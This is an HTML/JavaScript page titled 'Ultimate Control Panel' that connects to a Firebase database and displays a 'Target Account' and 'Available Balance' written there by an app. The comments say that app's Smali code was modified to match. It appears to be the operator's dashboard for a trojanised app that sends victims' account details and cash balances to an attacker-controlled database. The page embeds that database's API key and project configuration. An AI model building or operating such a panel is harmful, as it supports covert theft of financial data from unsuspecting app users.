<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate Control Panel</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #0d1117; color: #c9d1d9; margin: 0; padding: 20px; }
        .dashboard { max-width: 900px; margin: auto; background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 25px; }
        .header { border-bottom: 1px solid #30363d; padding-bottom: 15px; margin-bottom: 20px; color: #58a6ff; font-size: 24px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .card { background: #0d1117; padding: 20px; border-radius: 8px; border: 1px solid #30363d; }
        .card-label { color: #8b949e; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; }
        .card-value { font-size: 22px; font-weight: bold; color: #3fb950; margin-top: 10px; font-family: monospace; }
        #status-indicator { font-size: 14px; margin-top: 20px; color: #f0883e; }
    </style>
</head>
<body>

<div class="dashboard">
    <div class="header">Live Connection Monitor</div>
    <div id="status-indicator">Connecting to sudancontrol-c5050...</div>
    
    <div class="grid">
        <div class="card">
            <div class="card-label">Target Account (From App)</div>
            <div id="display_acc" class="card-value">WAITING...</div>
        </div>
        <div class="card">
            <div class="card-label">Available Balance (Cash)</div>
            <div id="display_cash" class="card-value">WAITING...</div>
        </div>
    </div>
</div>

<script>
    // Configuration from your google-services.json
    const firebaseConfig = {
        apiKey: "AIzaSyAoAfx2voGpTuXh2I-V2XpgOyn5kAM6YIA",
        authDomain: "sudancontrol-c5050.firebaseapp.com",
        databaseURL: "https://sudancontrol-c5050-default-rtdb.firebaseio.com",
        projectId: "sudancontrol-c5050",
        storageBucket: "sudancontrol-c5050.firebasestorage.app",
        messagingSenderId: "111262781250",
        appId: "1:111262781250:android:1b7bebdb45d69df294c2db"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // THIS IS THE BRIDGE: MATCHING THE APP'S "Updates" PATH
    const appRef = database.ref('Updates');

    appRef.on('value', (snapshot) => {
        const status = document.getElementById('status-indicator');
        if (snapshot.exists()) {
            status.innerHTML = "Status: <span style='color:#3fb950'>Data Received Successfully</span>";
            
            snapshot.forEach((child) => {
                const data = child.val();
                
                // Matching the exact keys used in your Smali code
                if (data.Account) {
                    document.getElementById('display_acc').innerText = data.Account;
                }
                if (data.Cash) {
                    document.getElementById('display_cash').innerText = data.Cash;
                }
            });
        } else {
            status.innerText = "Status: Connected to Server. Waiting for App to send data to 'Updates'...";
        }
    });
</script>

</body>
</html>
